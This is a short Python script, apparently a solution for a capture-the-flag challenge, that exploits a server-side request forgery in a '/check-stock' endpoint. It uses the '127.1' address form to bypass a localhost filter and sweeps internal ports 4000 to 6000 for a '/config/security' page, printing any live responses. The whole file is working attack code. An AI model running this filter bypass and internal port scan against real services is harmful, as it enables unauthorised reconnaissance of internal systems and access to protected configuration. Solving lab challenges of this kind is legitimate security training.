# Run in YOUR VM. 127.1 already bypasses the filter; sweep 4000-6000 for the live port.
import requests

BASE = "https://<host>/check-stock"  # reemplazar <host> por la instancia del reto

def check(url):
    try:
        r = requests.post(BASE, json={"url": url}, timeout=6)
        try:
            return r.json()
        except ValueError:
            return {"_raw": r.text}
    except Exception as e:
        return {"_exc": str(e)}

live = []
for port in range(4000, 6001):
    res = check(f"http://127.1:{port}/config/security")
    err = res.get("error", "")
    # "No se pudo conectar" = closed port -> skip quietly
    if "No se pudo conectar" in err:
        continue
    # Anything else is worth seeing: data, a different error, or the flag
    print(f"[+] puerto {port}: {str(res)[:400]}")
    live.append(port)

print("\nPuertos interesantes:", live)
